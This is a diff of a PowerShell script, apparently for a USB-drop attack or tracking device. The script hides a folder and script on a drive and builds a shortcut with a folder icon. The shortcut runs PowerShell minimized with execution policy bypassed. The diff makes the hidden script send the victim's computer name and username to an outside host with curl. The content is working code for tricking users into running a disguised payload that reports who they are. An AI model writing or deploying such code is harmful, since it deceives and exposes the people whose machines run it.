@@ -9,7 +9,7 @@ $ID=$GEN[0]
 # Create hidden folder and it's script
 $SCRIPT_LOC="$DRIVE\hidden\run.ps1"
 New-Item -ItemType Directory -Force -Path "$DRIVE\hidden"
-Write-Output "curl http://$IP/$ID" > $SCRIPT_LOC
+Write-Host -NoNewline 'curl.exe --header "X-ComputerName: $env:COMPUTERNAME" --header "X-Username: $env:USERNAME"'"http://$IP/$ID" 6> $SCRIPT_LOC
 attrib +r +h +s "$DRIVE\hidden"
 
 # Create shortcut from script to root
@@ -19,5 +19,6 @@ $S.TargetPath = "powershell.exe"
 $S.Arguments = "-ExecutionPolicy Bypass -File $SCRIPT_LOC"
 # for whatever reason 7 means minimized
 $S.WindowStyle = 7
+# Icons are stored as an array, the folder icon is 3
 $S.IconLocation = "%SystemRoot%\System32\SHELL32.dll,3"
 $S.Save();
